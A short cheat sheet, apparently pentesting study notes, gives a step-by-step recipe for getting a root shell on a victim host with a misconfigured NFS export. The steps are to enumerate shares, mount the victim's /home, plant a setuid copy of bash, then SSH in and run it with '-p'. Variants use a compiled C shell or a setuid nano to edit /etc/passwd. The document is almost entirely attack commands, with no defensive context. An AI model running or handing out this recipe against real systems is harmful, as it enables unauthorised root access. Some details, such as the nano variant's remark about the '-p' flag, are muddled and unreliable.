# Privilege Escalation using misconfigured NFS
Port 111 and Port 2049 should be opened.
1. nmap -sV --script=nfs-showmount victim IP ADDRESS

              OR

    showmount -e IP ADDRESS

2. for privilege escalation do the following on Kali m/c

  1. mkdir /tmp/abc
  2. mount -t nfs victim IP ADDRESS:/home /tmp/abc
  3. cd /tmp/abc
  4. cp /bin/bash .
  5. chmod +s bash
  6. ls -la bash
  7. Now to check - df -h and see our mounted directory

3. Now ssh into victim machine -
  1. cd /home
  2. ls -la
  3. You should see 'bash' which we created
  4. Run ./bash -p
  5. We should have a root shell!

A.  Instead of copying /bin/bash in 2 we can do the same by creating a binary called
  "shell" made by a C script and then do the same.
B.  Can also use nano editor the same way giving it 4777 privileges and then loading up
/etc/passwd in it but remember -p flag!

NOTE : -p flag is extremely important!
